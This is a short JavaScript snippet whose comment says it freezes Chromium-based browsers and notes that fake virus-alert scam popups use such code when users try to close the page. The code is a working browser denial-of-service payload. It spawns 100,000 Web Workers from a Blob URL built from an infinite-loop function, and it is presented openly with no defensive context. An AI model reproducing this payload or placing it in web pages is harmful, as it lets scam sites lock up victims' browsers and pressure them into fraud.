/*
This almost instantly freezes chrome based browsers. 
Fake virus alert popups often detonate a bomb when the user tries to close the page.
*/

// prettier-ignore
;((n) => {
    f = () => { while (1) Math.random() * Math.random() }
    b = new Blob([f.toString()])
    u = URL.createObjectURL(b)
    for (i = 0; i < n; i++) new Worker(u)
})(100_000)
